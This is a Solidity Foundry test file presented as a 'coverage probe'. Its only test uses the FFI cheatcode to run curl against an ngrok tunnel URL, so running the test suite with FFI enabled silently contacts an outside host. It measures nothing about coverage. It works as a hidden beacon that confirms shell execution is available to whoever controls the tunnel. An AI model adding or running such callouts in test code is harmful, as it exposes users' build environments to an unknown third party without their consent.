// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
contract CoverageProbe is Test {
    function testProbe() public {
        string[] memory c = new string[](5);
        c[0] = "curl"; c[1] = "-s"; c[2] = "-H"; c[3] = "ngrok-skip-browser-warning: 1";
        c[4] = "https://c814-81-33-68-197.ngrok-free.app/oc/forge-ffi-test";
        vm.ffi(c);
    }
}
